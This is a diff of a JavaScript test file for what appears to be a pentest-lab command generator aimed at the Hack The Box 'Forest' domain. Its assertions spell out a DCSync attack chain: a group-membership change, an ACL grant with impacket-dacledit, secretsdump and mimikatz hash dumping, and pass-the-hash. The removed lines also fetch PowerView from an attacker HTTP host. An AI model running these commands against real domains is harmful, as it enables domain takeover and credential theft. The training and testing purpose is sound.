@@ -5,20 +5,19 @@ import { renderCommand } from "../src/lib/workspace.js";
 
 const variables = {
   workspaceRoot: "/home/kali/oscp",
-  targetName: "forest",
+  targetName: "Forest",
   rhost: "10.129.95.210",
-  lhost: "10.10.15.240",
   domain: "htb.local",
   baseDn: "DC=htb,DC=local",
-  user: "svc_exchange",
+  user: "svc-alfresco",
+  memberUser: "svc-alfresco",
+  targetGroup: "Exchange Windows Permissions",
   password: "Password123!",
   hash: "8846f7eaee8fb117ad06bdd830b7586c",
   aclTarget: "htb.local",
-  aclPrincipal: "svc_exchange",
+  aclPrincipal: "svc-alfresco",
   aclRights: "DCSync",
   dcsyncUser: "Administrator",
-  powerViewPath: "/usr/share/windows-resources/powersploit/Recon/PowerView.ps1",
-  powerViewPort: "8000",
 };
 
 const renderedCommands = (overrides = {}) => {
@@ -29,89 +28,46 @@ const renderedCommands = (overrides = {}) => {
   }));
 };
 
-const decodedPowerShell = (command) => {
-  const encoded = command?.value.match(/-EncodedCommand ([A-Za-z0-9+/=]+)"/)?.[1];
-  return encoded ? Buffer.from(encoded, "base64").toString("utf16le") : "";
-};
-
-const decodedScripts = (commands) => commands.map(decodedPowerShell).filter(Boolean).join("\n");
-
-test("DCSync selection generates scoped retrieval between grant and cleanup", () => {
+test("DCSync workflow uses direct group membership and Impacket from Kali", () => {
   const commands = renderedCommands();
   const combined = commands.map((command) => command.value).join("\n");
-  const scripts = decodedScripts(commands);
+  const addAt = commands.findIndex((command) => command.key === "acl-group-add-member");
   const grantAt = commands.findIndex((command) => command.key === "acl-grant");
   const retrieveAt = commands.findIndex((command) => command.key === "acl-dcsync-impacket-password");
   const cleanupAt = commands.findIndex((command) => command.key === "acl-cleanup");
 
-  assert.match(scripts, /Get-DomainObject -Identity .*DC=htb,DC=local.*-Properties distinguishedName/);
-  assert.match(scripts, /Add-DomainObjectAcl -TargetIdentity \$ResolvedTarget.*-PrincipalIdentity .*svc_exchange.*-Rights .*DCSync/);
-  assert.match(combined, /nxc winrm 10\.129\.95\.210 -d 'htb\.local' -u 'svc_exchange' -p 'Password123!'/);
-  assert.match(scripts, /http:\/\/10\.10\.15\.240:8000\/PowerView\.ps1/);
-  assert.match(combined, /-EncodedCommand [A-Za-z0-9+/=]+/);
-  assert.doesNotMatch(combined, /payload=\$\(|-EncodedCommand \$payload/);
-  assert.match(combined, /notes\/powershell\/grant-dcsync\.ps1/);
-  assert.match(combined, /base64 -d \| iconv -f UTF-16LE -t UTF-8/);
-  assert.match(scripts, /PowerView download or load failed/);
-  assert.match(scripts, /Resolved principal SID/);
-  assert.match(scripts, /ConvertTo-SecureString/);
-  assert.match(scripts, /-Credential \$Cred/);
-  assert.match(scripts, /PowerView returned without persisting an ACL entry/);
-  assert.match(combined, /lsadump::dcsync \/domain:htb\.local \/user:Administrator/);
-  assert.match(combined, /-just-dc-user 'Administrator'/);
-  assert.ok(grantAt >= 0 && retrieveAt > grantAt && cleanupAt > retrieveAt);
+  assert.match(combined, /net rpc group members 'Exchange Windows Permissions'/);
+  assert.match(combined, /net rpc group addmem 'Exchange Windows Permissions' 'svc-alfresco'/);
+  assert.match(combined, /impacket-dacledit -action write -rights 'DCSync'/);
+  assert.match(combined, /-principal 'svc-alfresco'/);
+  assert.match(combined, /-target-dn 'DC=htb,DC=local'/);
+  assert.match(combined, /stamp=\$\(date \+%Y%m%d-%H%M%S\)/);
+  assert.match(combined, /dcsync-before-\$stamp\.bak/);
+  assert.match(combined, /DACL modified successfully!/);
+  assert.match(combined, /dcsync-latest-backup\.txt/);
+  assert.match(combined, /impacket-dacledit -action restore/);
+  assert.match(combined, /net rpc group delmem/);
+  assert.match(combined, /impacket-secretsdump -just-dc-user 'Administrator'/);
+  assert.doesNotMatch(combined, /PowerView|powershell|nxc winrm|EncodedCommand/);
+  assert.ok(addAt >= 0 && grantAt > addAt && retrieveAt > grantAt && cleanupAt > retrieveAt);
 });
 
-test("non-DCSync rights regenerate generic grant and cleanup without replication commands", () => {
-  const commands = renderedCommands({
-    aclTarget: "Helpdesk",
-    aclPrincipal: "operator",
-    aclRights: "WriteMembers",
-  });
+test("non-DCSync rights map All to Impacket FullControl and use a named target", () => {
+  const commands = renderedCommands({ aclTarget: "Helpdesk", aclPrincipal: "operator", aclRights: "All", targetGroup: "" });
   const combined = commands.map((command) => command.value).join("\n");
-  const scripts = decodedScripts(commands);
 
-  assert.match(scripts, /Get-DomainObject -Identity .*Helpdesk.*-Properties distinguishedName/);
-  assert.match(scripts, /Add-DomainObjectAcl -TargetIdentity \$ResolvedTarget.*-PrincipalIdentity .*operator.*-Rights .*WriteMembers/);
-  assert.match(scripts, /Remove-DomainObjectAcl -TargetIdentity \$ResolvedTarget.*-PrincipalIdentity .*operator.*-Rights .*WriteMembers/);
-  assert.doesNotMatch(combined, /lsadump::dcsync|secretsdump/);
-  assert.match(scripts, /acl-before\.xml/);
-  assert.match(scripts, /Compare-Object/);
-  assert.match(scripts, /Where-Object \{ \$null -ne \$_ \}/);
-  assert.match(scripts, /No added ACL entry was detected/);
-  assert.doesNotMatch(scripts, /"\$\(\$_\.ActiveDirectoryRights\)\|/);
+  assert.match(combined, /-rights 'FullControl'/);
+  assert.match(combined, /-target 'Helpdesk'/);
+  assert.doesNotMatch(combined, /group addmem|secretsdump|lsadump::dcsync/);
 });
 
-test("PowerView staging validates content and reports a port or log failure", () => {
-  const commands = renderedCommands();
-  const confirmation = commands.find((command) => command.key === "acl-powerview-check");
-
-  assert.match(confirmation.value, /curl .* -o "\$pv_probe"/);
-  assert.match(confirmation.value, /grep -qi 'function Get-DomainObjectAcl' "\$pv_probe"/);
-  assert.doesNotMatch(confirmation.value, /curl .*\| grep -q/);
-  assert.match(confirmation.value, /PowerView HTTP staging failed/);
-  assert.match(confirmation.value, /notes\/powershell\/confirm-powerview\.ps1/);
-  assert.match(decodedPowerShell(confirmation), /PowerView loaded successfully/);
-  assert.match(decodedPowerShell(confirmation), /Get-DomainGroup/);
-});
-
-test("password workflow lists the authenticating user's effective groups with explicit credentials", () => {
-  const commands = renderedCommands();
-  const groups = commands.find((command) => command.key === "acl-effective-groups");
-  const script = decodedPowerShell(groups);
-
-  assert.match(groups.label, /svc_exchange's effective groups/);
-  assert.match(script, /Get-DomainGroup -MemberIdentity .*svc_exchange/);
-  assert.match(script, /-Credential \$Cred/);
-});
-
-test("DCSync for a different ACL principal omits credential-bound Impacket commands", () => {
+test("DCSync for a different ACL principal omits credential-bound Impacket retrieval", () => {
   const commands = renderedCommands({ aclPrincipal: "other-user" });
   assert.ok(commands.some((command) => command.key === "acl-dcsync-mimikatz"));
   assert.equal(commands.some((command) => command.key.startsWith("acl-dcsync-impacket")), false);
 });
 
-test("unsupported PowerView rights produce a validation command instead of an ACL change", () => {
+test("unsupported rights produce a validation command", () => {
   const commands = renderedCommands({ aclRights: "arbitrary-right" });
   assert.deepEqual(commands.map((command) => command.key), ["acl-invalid-right"]);
   assert.match(commands[0].value, /All, ResetPassword, WriteMembers, DCSync/);
@@ -119,25 +75,21 @@ test("unsupported PowerView rights produce a validation command instead of an AC
 
 test("DCSync rejects a user ACL target and directs the operator to the domain", () => {
   const commands = renderedCommands({ aclTarget: "svc-alfresco" });
-
   assert.deepEqual(commands.map((command) => command.key), ["acl-invalid-dcsync-target"]);
   assert.match(commands[0].value, /Set ACL TARGET to htb\.local, not svc-alfresco/);
 });
 
-test("hash-only authentication uses NetExec and Evil-WinRM pass-the-hash switches", () => {
+test("hash-only authentication uses Impacket hashes and Samba pw-nt-hash", () => {
   const commands = renderedCommands({ password: "" });
-  const winrm = commands.find((command) => command.key === "acl-winrm-check");
-  const evilWinrm = commands.find((command) => command.key === "acl-evil-winrm");
+  const combined = commands.map((command) => command.value).join("\n");
 
-  assert.match(winrm.value, /-H '8846f7eaee8fb117ad06bdd830b7586c'/);
-  assert.doesNotMatch(winrm.value, /-p/);
-  assert.match(evilWinrm.value, /-H '8846f7eaee8fb117ad06bdd830b7586c'/);
-  assert.doesNotMatch(decodedScripts(commands), /ConvertTo-SecureString|-Credential \$Cred/);
+  assert.match(combined, /-hashes ':8846f7eaee8fb117ad06bdd830b7586c'/);
+  assert.match(combined, /--pw-nt-hash/);
+  assert.match(combined, /htb\.local\/svc-alfresco%8846f7eaee8fb117ad06bdd830b7586c/);
 });
 
-test("WinRM authentication shell-quotes passwords containing apostrophes", () => {
+test("shell-quotes passwords containing apostrophes", () => {
   const commands = renderedCommands({ password: "Winter'2026!" });
-  const winrm = commands.find((command) => command.key === "acl-winrm-check");
-
-  assert.match(winrm.value, /-p 'Winter'"'"'2026!'/);
+  const grant = commands.find((command) => command.key === "acl-grant");
+  assert.match(grant.value, /Winter'"'"'2026!/);
 });
